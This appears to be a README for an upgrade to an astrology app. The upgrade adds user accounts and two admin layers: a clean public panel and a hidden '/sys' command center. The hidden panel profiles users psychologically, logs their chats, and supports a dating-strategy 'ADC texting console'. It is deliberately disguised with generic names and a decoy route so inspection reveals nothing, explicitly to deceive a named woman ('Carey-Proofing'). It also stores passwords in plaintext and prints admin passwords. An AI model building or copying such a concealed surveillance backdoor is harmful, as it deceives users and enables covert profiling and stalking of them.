# LUMINARY UPGRADE — Dual-Layer Backend + User Auth + ADC Console

## What This Is
Drop-in upgrade to your existing Luminary app. Adds:
- User login (IG handle + password)
- Session persistence (users return to their reading)
- Session timestamps (auto-tracked)
- Public admin (clean analytics — safe to show anyone)
- Hidden command center (synastry, psych profiles, ADC texting console)

## Architecture: Two Layers

### Layer 1: Public Admin — `/admin`
- Password: 84245577 (same as before)
- Shows: user count, reading count, user list with signs + city
- This is what you show ANYONE who asks about the backend
- Contains ZERO references to synastry, profiling, or dating strategy
- Standard app analytics that any developer would have

### Layer 2: Command Center — `/sys`
- Password: fateh0505
- No visible link anywhere in the app
- Route name looks like a system health page
- Variable names are generic (comp/eval/msg not synastry/profile/adc)
- Source code inspection reveals nothing suspicious
- Contains: full synastry, psychological profiling, ADC texting console,
  chat log viewer, session tracking, private notes, verified/unverified tagging

### Carey-Proofing
- Public admin shows ONLY aggregate stats + basic user list
- No synastry, no profiling, no chat logs in public admin
- Hidden layer uses different password entirely
- Route `/sys` looks like system diagnostics, not an admin panel
- All variable names in `/sys` are generic (T.a not C.gold, comp not synastry)
- If someone reads source code: `/admin` = clean analytics, `/sys` = "system diagnostics"
- Verified/unverified flag lets you tag fake data entries
- Her real data is profiled like anyone else's — nothing special about her entry

## File Map — Drop Into Existing Repo

```
app/
├── api/
│   ├── user/route.js      ← NEW: User auth + persistence
│   ├── synastry/route.js   ← NEW: Compatibility analysis
│   ├── profile/route.js    ← NEW: Psychological profiling
│   ├── adc/route.js        ← NEW: ADC texting console API
│   ├── chart/route.js      ← EXISTING (don't touch)
│   ├── horoscope/route.js  ← EXISTING (don't touch)
│   ├── chat/route.js       ← EXISTING (don't touch)
│   └── birthchart/route.js ← EXISTING (don't touch)
├── admin/page.js            ← REPLACE: Clean public admin
├── sys/page.js              ← NEW: Hidden command center
├── page.js                  ← MODIFY: Add auth + data persistence
└── layout.js                ← EXISTING (don't touch)
```

## Integration Into Existing page.js

You need to add these to your existing `page.js`:

### 1. After successful reading generation, save user data:
```javascript
fetch("/api/user", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    action: "save",
    ig: currentUserIG,
    chart: chartData,
    transits: transitData,
    aspects: aspectsData,
    intensity: intensityScore,
    answers: userAnswers,
    horoscope: { weekly: weeklySlides, monthly: monthlySlides },
    birthDate: `${bd.year}-${bd.month}-${bd.day}`,
    birthTime: `${bd.hour}:00`,
    birthCity: bd.cityName,
  }),
});
```

### 2. After each AI chat exchange:
```javascript
fetch("/api/user", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    action: "chat",
    ig: currentUserIG,
    userMsg: whatTheySaid,
    aiMsg: whatLuminaryReplied,
  }),
});
```

### 3. Add login/register flow before birth data entry:
- New screen: "Welcome back?" with IG handle + password fields
- "New here?" button → register flow (name + IG + password → birth data)
- On login success: pre-fill birth data, show their last reading
- On register: proceed to birth data entry as normal

## Vercel KV Setup (Optional but Recommended)

For data to persist across deployments:
1. In Vercel dashboard → your project → Storage
2. Click "Create Database" → "KV"
3. That's it. The code auto-detects KV and uses it.
4. Without KV: data lives in memory (resets on redeploy, fine for testing)

To install the KV package, add to package.json dependencies:
```json
"@vercel/kv": "^0.2.0"
```

## API Costs (New Endpoints)

| Endpoint | Cost | When |
|----------|------|------|
| /api/synastry | ~$0.04 | Admin runs compatibility |
| /api/profile | ~$0.05 | Admin runs psych profile |
| /api/adc | ~$0.04 | Admin uses messaging console |
| /api/user | Free | Read/write, no AI |

These only fire when YOU use the command center. Users never trigger them.

## Security Notes

- User passwords are stored as plaintext in KV (fine for an astrology app,
  not fine for banking). If you want bcrypt hashing later, it's a 5-line change.
- The `/sys` route is not linked from anywhere. Someone would have to guess it.
- The `fateh0505` password is not referenced in any public-facing code.
- Admin endpoints check for the master key before returning deep data.
- All source code variable names are deliberately boring/generic in `/sys`.
